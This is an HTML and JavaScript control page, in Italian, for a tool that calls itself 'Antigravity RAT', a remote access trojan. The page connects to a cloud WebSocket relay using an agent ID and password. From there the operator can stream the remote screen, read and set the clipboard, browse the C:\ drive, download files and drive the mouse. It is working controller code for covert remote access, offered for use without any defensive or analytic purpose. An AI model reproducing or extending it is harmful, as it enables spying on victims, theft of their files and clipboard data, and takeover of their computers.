<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Antigravity RAT - Cloud Viewer</title>
    <style>
        :root {
            --bg: #0d1117;
            --card-bg: #161b22;
            --accent: #58a6ff;
            --text: #c9d1d9;
            --danger: #f85149;
            --success: #3fb950;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }

        .container {
            width: 100%;
            max-width: 1100px;
            background: var(--card-bg);
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
            text-align: center;
        }

        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            background: #21262d;
            font-size: 0.8rem;
            margin-bottom: 1rem;
        }

        .status-dot {
            height: 10px; width: 10px;
            background-color: #8b949e;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }

        .connected .status-dot { background-color: var(--success); box-shadow: 0 0 10px var(--success); }

        .hidden { display: none !important; }

        input, select, textarea, button {
            font-family: inherit;
            background: #0d1117;
            border: 1px solid #30363d;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 10px;
        }

        .btn-primary { background: var(--accent); border: none; font-weight: bold; cursor: pointer; padding: 12px 25px; }
        .btn-primary:hover { opacity: 0.9; }

        .login-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            padding: 20px;
            border: 1px solid #30363d;
            border-radius: 8px;
            background: rgba(0,0,0,0.2);
        }

        #log {
            background: #010409;
            color: #7d8590;
            padding: 10px;
            border-radius: 6px;
            text-align: left;
            font-family: monospace;
            font-size: 0.75rem;
            height: 60px;
            overflow-y: auto;
            margin-top: 15px;
        }

        canvas { width: 100%; background: #000; border-radius: 8px; margin-top: 15px; border: 1px solid #30363d; }

        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }

        .panel { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 8px; border: 1px solid #30363d; text-align: left; }
        .panel label { display: block; font-size: 0.75rem; color: #8b949e; margin-bottom: 5px; }

        #file-list {
            background: #0d1117;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 10px;
        }

        .file-item {
            display: flex;
            align-items: center;
            padding: 8px;
            border-bottom: 1px solid #21262d;
            cursor: pointer;
            font-size: 0.85rem;
        }
        .file-item:hover { background: rgba(88, 166, 255, 0.1); }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="margin:0; color:var(--accent)">Antigravity RAT - Pro Viewer</h2>
        <div id="connection-status" class="status-badge">
            <span class="status-dot"></span> Offline
        </div>

        <!-- Login -->
        <div id="login-section" class="login-box">
            <div style="width: 100%; text-align: left;">
                <label style="font-size: 0.7rem; color: var(--accent);">Relay Link (es. wss://tua-app.onrender.com)</label>
                <input type="text" id="relay-url" placeholder="wss://..." style="width:100%">
            </div>
            <div style="display:flex; gap:10px; width: 100%;">
                <input type="text" id="target-id" placeholder="Agent ID" style="flex:1">
                <input type="password" id="agent-password" placeholder="Password" style="flex:1">
            </div>
            <button id="connect-btn" class="btn-primary" style="width:100%">Connect to Cloud Relay</button>
        </div>

        <div id="main-ui" class="hidden">
            <div class="control-grid">
                <!-- Video Controls -->
                <div class="panel">
                    <div style="font-size: 1.2rem; font-weight: bold; color: var(--success); margin-bottom: 10px;">
                        FPS: <span id="fps-counter">0</span>
                    </div>
                    <label>Streaming Mode</label>
                    <select id="res-mode" style="width:100%">
                        <option value="performance">Extreme Speed (480p)</option>
                        <option value="quality">High Quality (720p)</option>
                    </select>
                    <label>JPEG Quality</label>
                    <input type="range" id="quality-range" min="10" max="95" value="40" style="width:100%">
                    <button id="stream-btn" class="btn-primary" style="width:100%; margin-top:10px">Start Live Stream</button>
                </div>

                <!-- Clipboard & Tools -->
                <div class="panel">
                    <label>Remote Clipboard</label>
                    <textarea id="clipboard-text" style="width:100%; height:40px; margin-bottom:10px"></textarea>
                    <div style="display:flex; gap:5px">
                        <button id="get-clip-btn" style="flex:1">Fetch</button>
                        <button id="set-clip-btn" style="flex:1">Set</button>
                    </div>
                </div>

                <!-- Explorer -->
                <div class="panel">
                    <label>Explorer: <span id="current-path" style="color:var(--accent)">C:\</span></label>
                    <div id="file-list"></div>
                    <input type="text" id="download-path" placeholder="Path to download..." style="width:100%; margin-top:10px; font-size:0.75rem">
                    <button id="download-btn" style="width:100%; font-size:0.75rem">Download File</button>
                </div>
            </div>

            <canvas id="remote-screen"></canvas>
        </div>

        <div id="log">> In attesa di connessione...</div>
    </div>

    <script>
        let socket;
        let isStreaming = false;
        let currentPath = "C:\\";
        let frameCount = 0;
        let lastFPSUpdate = Date.now();

        const logEl = document.getElementById('log');
        const statusEl = document.getElementById('connection-status');
        const mainUI = document.getElementById('main-ui');
        const loginSection = document.getElementById('login-section');
        const canvas = document.getElementById('remote-screen');
        const ctx = canvas.getContext('2d');
        const fpsCounter = document.getElementById('fps-counter');

        function appendLog(msg) {
            logEl.innerHTML += `<br>> ${msg}`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        document.getElementById('connect-btn').onclick = () => {
            const url = document.getElementById('relay-url').value;
            const id = document.getElementById('target-id').value;
            const pass = document.getElementById('agent-password').value;

            if (!url) return alert("Inserisci il link del Relay!");

            appendLog(`Connecting to ${url}...`);
            socket = new WebSocket(url);
            socket.binaryType = 'blob';

            socket.onopen = () => {
                statusEl.classList.add('connected');
                statusEl.innerHTML = '<span class="status-dot"></span> Connected to Relay';
                socket.send(JSON.stringify({ type: 'register', role: 'viewer', targetId: id, password: pass }));
            };

            socket.onmessage = (event) => {
                if (event.data instanceof Blob) {
                    frameCount++;
                    const now = Date.now();
                    if (now - lastFPSUpdate >= 1000) {
                        fpsCounter.textContent = frameCount;
                        frameCount = 0;
                        lastFPSUpdate = now;
                    }

                    const urlImg = URL.createObjectURL(event.data);
                    const img = new Image();
                    img.onload = () => {
                        canvas.width = img.width;
                        canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        URL.revokeObjectURL(urlImg);
                    };
                    img.src = urlImg;
                    return;
                }

                const data = JSON.parse(event.data);
                if (data.type === 'registered') {
                    appendLog("Accesso Autorizzato!");
                    loginSection.classList.add('hidden');
                    mainUI.classList.remove('hidden');
                    socket.send(JSON.stringify({ type: 'stop_stream' }));
                    requestDir(currentPath);
                } else if (data.type === 'file_list') renderFileList(data.path, data.items);
                else if (data.type === 'clipboard_data') document.getElementById('clipboard-text').value = data.content;
                else if (data.type === 'file_download') handleFileDownload(data);
                else if (data.type === 'error') appendLog(`ERROR: ${data.message}`);
            };

            socket.onerror = (err) => appendLog("Errore di connessione al Relay.");
            socket.onclose = () => {
                statusEl.classList.remove('connected');
                statusEl.innerHTML = '<span class="status-dot"></span> Offline';
                appendLog("Connessione chiusa.");
            };
        };

        document.getElementById('stream-btn').onclick = function() {
            isStreaming = !isStreaming;
            this.textContent = isStreaming ? 'Stop Stream' : 'Start Live Stream';
            this.style.background = isStreaming ? 'var(--danger)' : 'var(--accent)';
            if (isStreaming) {
                socket.send(JSON.stringify({ 
                    type: 'start_stream', 
                    quality: parseInt(document.getElementById('quality-range').value),
                    mode: document.getElementById('res-mode').value
                }));
            } else {
                socket.send(JSON.stringify({ type: 'stop_stream' }));
            }
        };

        function requestDir(path) {
            currentPath = path;
            document.getElementById('current-path').textContent = path;
            socket.send(JSON.stringify({ type: 'list_dir', path }));
        }

        function renderFileList(path, items) {
            const list = document.getElementById('file-list');
            list.innerHTML = '';
            items.forEach(item => {
                const div = document.createElement('div');
                div.className = 'file-item';
                div.innerHTML = `${item.is_dir ? '📁' : '📄'} ${item.name}`;
                div.onclick = () => {
                    const full = path.endsWith('\\') ? path + item.name : path + '\\' + item.name;
                    if (item.is_dir) requestDir(full);
                    else document.getElementById('download-path').value = full;
                };
                list.appendChild(div);
            });
        }

        document.getElementById('get-clip-btn').onclick = () => socket.send(JSON.stringify({ type: 'get_clipboard' }));
        document.getElementById('set-clip-btn').onclick = () => socket.send(JSON.stringify({ type: 'set_clipboard', content: document.getElementById('clipboard-text').value }));
        document.getElementById('download-btn').onclick = () => socket.send(JSON.stringify({ type: 'request_download', path: document.getElementById('download-path').value }));

        function handleFileDownload(data) {
            const byteCharacters = atob(data.data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray]);
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a'); a.href = url; a.download = data.filename; a.click();
        }

        // Mouse Events
        canvas.addEventListener('mousedown', (e) => sendMouse('mousedown', e));
        canvas.addEventListener('mouseup', (e) => sendMouse('mouseup', e));
        canvas.addEventListener('mousemove', (e) => { if (e.buttons === 1) sendMouse('mousemove', e); });
        canvas.oncontextmenu = (e) => { e.preventDefault(); sendMouse('rightclick', e); };

        function sendMouse(action, e) {
            if (!isStreaming) return;
            const rect = canvas.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            socket.send(JSON.stringify({ type: 'mouse_event', action, x, y }));
        }
    </script>
</body>
</html>
